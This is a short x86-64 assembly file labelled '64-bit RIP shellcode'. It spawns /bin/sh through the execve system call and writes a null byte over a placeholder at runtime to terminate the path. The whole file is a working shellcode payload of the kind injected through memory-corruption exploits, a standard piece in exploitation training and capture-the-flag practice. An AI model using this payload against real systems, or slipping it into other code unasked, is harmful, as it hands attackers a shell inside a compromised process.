
#
# 64-bit RIP shellcode
#

.global main

.data
main: 
    jmp run

shell: 
    .ascii "/bin/shN"

run: 
      # execve(char *filename, char *argv[], char *envp[]);
    xorq %rax,%rax
    addq $59,%rax           # 59 = execve
    lea shell(%rip), %rdi
    movb $0x0,7(%rdi)       # put a null byte after /bin/sh (replace N)
    xorq %rsi,%rsi          # char *argv[] = null
    xorq %rdx,%rdx          # char *envp[] = null
    syscall

